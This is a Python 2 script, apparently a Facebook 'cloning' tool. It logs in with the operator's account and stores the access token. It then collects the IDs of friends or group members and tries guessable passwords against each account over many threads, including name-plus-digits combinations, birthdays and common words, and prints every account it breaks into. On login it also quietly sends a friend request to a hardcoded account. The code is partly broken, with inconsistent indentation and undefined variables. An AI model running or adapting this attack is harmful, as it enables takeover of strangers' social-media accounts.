#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To Mr HACKER XD

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

##### LOGO #####
logo = """

 \033[1;31;40m███████████████████████████
 \033[1;32;40m█▄─▄▄▀██▀▄─██▄─▀█▄─▄██▀▄─██
 \033[1;32;40m██─▄─▄██─▀─███─█▄▀─███─▀─██
 \033[1;32;40m▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▀▄▄▀\033[1;33;40mꜰᴀꜱᴛ🔥

                                   
\033[1;31;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅๑۩🅡🅐🅡۩๑▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
\033[1;32;40m ➣Author©  → RANA AAHIL
\033[1;33;40m ➣Github   → https://github.com/TheAahil
\033[1;34;40m ➣Youtube  → AAHIL CREATIONS
\033[1;35;40m ➣☏        → +920315786786
\033[1;36;40m ▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅▅
"""

###### LOGO2 ######
logo2 = """
	\033[1;32;40m  



██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝

  
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93m█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")

def login():
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo2
		print'\033[1;31;40m●═══════════════════════◄►═══════════════════════●'
		print' \033[1;92mWarning: \033[1;97mDo Not Use Your Real Account' 															
		print' \033[1;92mNote   : \033[1;97mUse a Fresh Account To Login' 
		print'\033[1;36;40m●═══════════════════════◄►═══════════════════════●'	
		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;92m ➣ \x1b[1;96m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;93mPassword\x1b[1;93m ➣ \x1b[1;35;40m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;96mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;36;40m[✓] Login Successful...'
				os.system('xdg-open https://www.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;91m[!] There is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36;40m      ╔═════════════════════════════════╗"
	print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"  	   \033[1;36;40m║"                               
	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
	print "\033[1;32;40m[1] \033[1;33;40mStart Cloning"	
	print "\033[1;32;40m[2] \033[1;33;40mUpdate fbw"																														
	print "\033[1;32;40m[0] \033[1;33;40mLogout"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
    print logo
    print '\033[37;1m[\033[32;1m01\033[37;1m] \033[33;1mDAFTAR TEMAN'
    print '\033[37;1m[\033[32;1m02\033[37;1m] \033[33;1mDAFTAR GROUP'
    print '\033[37;1m[\033[31;1m00\033[37;1m] \033[31;1mKELUAR'
    print "\033[31;1m========================================================"
    pilih_mbf()

def pilih_mbf():
    global okay
    peak = raw_input("\033[37;1mroot@R15K1\033[31;1m-\033[37;1m#\033[32;1m ")
    if peak == '':
        print '\x1b[31;1m[!] \x1b[31;1mJangan kosong'
        pilih_mbf()
    else:
        if peak == '1' or peak == '01':
            os.system('reset')
            print logo
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2' or peak == '02':
                os.system('reset')
                print logo
                idg = raw_input('\033[37;1m[\033[32;1m?\033[37;1m] Masukan ID group \033[36;1m:\033[37;1m ')
                try:
                    os.system('reset')
                    print logo
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\033[31;1m[✓]\033[32;1m Groups\033[31;1m :\033[37;1m ' + asw['name']
                except KeyError:
                    print '\x1b[31;1m[!] \x1b[31;1mGroups Tidak Ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mEnter Aja Gan \x1b[1;91m]')
                    menu()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0' or peak == '00':
                    os.system('rm -rf cookie')
                    keluar()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
                    pilih_mbf()
    print '\033[31;1m[+] \033[32;1mTotal ID\033[31;1m : \033[37;1m'+str(len(id))
    print "\033[36;1m========================================================"

    def main(arg):
        user = arg
        try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
	        b = json.loads(a.text)
		pass1 = b['first_name'] + '123'
		data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
		q = json.load(data)
		if 'access_token' in q:
		    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
		    z = json.loads(x.text)
		    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass1+"\033[36;1m |\033[37;1m "+z['name']
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                    	x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                        z = json.loads(x.text)
                        print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass2+"\033[36;1m |\033[37;1m "+z['name']
                    else:
                        pass3 = b['last_name'] + '123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                            z = json.loads(x.text)
                            print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass3+"\033[36;1m |\033[37;1m "+z['name']
                        else:
                            lahir = b['birthday']
                            pass4 = lahir.replace('/', '')
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                             	x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                z = json.loads(x.text)
                                print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass4+"\033[36;1m |\033[37;1m "+z['name']
                            else:
                                pass5 = a['first_name'] + 'ganteng123'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                    z = json.loads(x.text)
                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass5+"\033[36;1m |\033[37;1m "+z['name']
                                else:
                                    pass6 = a['first_name'] + 'cantik123'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                        z = json.loads(x.text)
                                        print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass6+"\033[36;1m |\033[37;1m "+z['name']
                                    else:
                                        pass7 = 'doraemon'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                            z = json.loads(x.text)
                                            print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass7+"\033[36;1m |\033[37;1m "+z['name']
                                        else:
                                            pass8 = 'sayang'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                z = json.loads(x.text)
                                                print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass8+"\033[36;1m |\033[37;1m "+z['name']
                                            else:
                                                pass9 = 'kontol123'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                    z = json.loads(x.text)
                                                    print "\033[37;1m[\033[32;1msucces\033[37;1m]\033[32;1m•>\033[37;1m "+user+"\033[36;1m |\033[37;1m "+pass9+"\033[36;1m |\033[37;1m "+z['name']
        except:
            pass
    meq = ThreadPool(30)
    meq.map(main, id)
    print "\033[31;1m========================================================"
    print "\033[32;1m[✓]\033[37;1m Done Ya Boss Q"
    os.system('rm -rf cookie')
    keluar()



if __name__ == '__main__':
    login()
